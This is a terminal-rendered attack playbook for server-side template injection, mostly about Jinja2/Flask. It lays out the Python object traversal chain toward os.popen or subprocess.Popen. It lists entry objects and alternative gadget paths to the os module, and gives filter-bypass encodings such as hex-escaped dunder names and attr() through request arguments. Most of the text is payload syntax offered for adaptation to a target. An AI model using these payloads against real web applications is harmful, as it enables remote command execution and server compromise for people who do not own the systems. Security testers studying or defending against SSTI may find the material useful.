[34m│[0m ## SSTI (Server-Side Template Injection) Attack Playbook                     [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m > **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be     [34m│[0m
[34m│[0m MODIFIED for your specific target. Replace placeholders like `{PAYLOAD}`,    [34m│[0m
[34m│[0m `{INDEX}`, `{COMMAND}` with actual values. Adapt payloads based on:          [34m│[0m
[34m│[0m > - Target template engine (Jinja2, Twig, Freemarker, Velocity, etc.)        [34m│[0m
[34m│[0m > - Available objects and filters                                            [34m│[0m
[34m│[0m > - Sandbox restrictions                                                     [34m│[0m
[34m│[0m > - Framework-specific syntax                                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Object Traversal Thinking                                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **GOAL:** Reach os.popen() or subprocess.Popen                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **THINK ABOUT THE OBJECT GRAPH:**                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Any object → __class__ → __mro__ → object → __subclasses__() → find Popen    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Entry Points (objects you can access)                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m - Literals: '', [], {}, 0, 0.0                                               [34m│[0m
[34m│[0m - Built-ins: request, config, self, g (Flask)                                [34m│[0m
[34m│[0m - Filters: lipsum, cycler, joiner, namespace                                 [34m│[0m
[34m│[0m - Imported: any module the app imports                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Traversal Patterns                                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m OBJECT.__class__.__mro__[X].__subclasses__()[Y]                              [34m│[0m
[34m│[0m        ↓                                                                     [34m│[0m
[34m│[0m Find X = index where 'object' base class is                                  [34m│[0m
[34m│[0m        ↓                                                                     [34m│[0m
[34m│[0m Find Y = index of useful class (Popen, _wrap_close, catch_warnings)          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Alternative Paths to os                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m - config.__class__.__init__.__globals__['os']                                [34m│[0m
[34m│[0m - request.application.__self__._get_data_for_json.__globals__['os']          [34m│[0m
[34m│[0m - lipsum.__globals__['os']                                                   [34m│[0m
[34m│[0m - cycler.__init__.__globals__['os']                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Jinja2/Python Object Traversal                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ''.__class__                  → ''|attr('__class__')                         [34m│[0m
[34m│[0m                               → ''|attr('\x5f\x5fclass\x5f\x5f')             [34m│[0m
[34m│[0m                               → ''|attr(request.args.x) with ?x=__class__    [34m│[0m
[34m│[0m                               → getattr('','__class__')                      [34m│[0m
